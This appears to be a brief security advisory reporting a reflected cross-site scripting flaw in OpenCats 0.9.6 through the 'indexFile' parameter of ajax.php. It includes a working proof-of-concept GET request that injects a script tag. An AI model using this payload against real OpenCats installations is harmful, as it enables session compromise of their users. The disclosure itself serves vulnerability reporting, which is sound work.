Cross Site Scripting vulnerability in the OpenCats 'indexFile'.

OpenCats version 0.9.6 PHP7.2 suffers from reflected XSS vulnerability. 
This allows attackers arbitrary JavaScript injection, which compromises secure session between client and server.

### PoC
```
GET //ajax.php?f=getPipelineJobOrder&joborderID=1&page=0&entriesPerPage=1&sortBy=dateCreatedInt&sortDirection=desc&indexFile=15)"></a><script>alert`xss`</script>&isPopup=0
```

![XSS4](https://user-images.githubusercontent.com/57464251/192361363-5a9c6b08-7204-4871-84ca-59069930c04f.png)
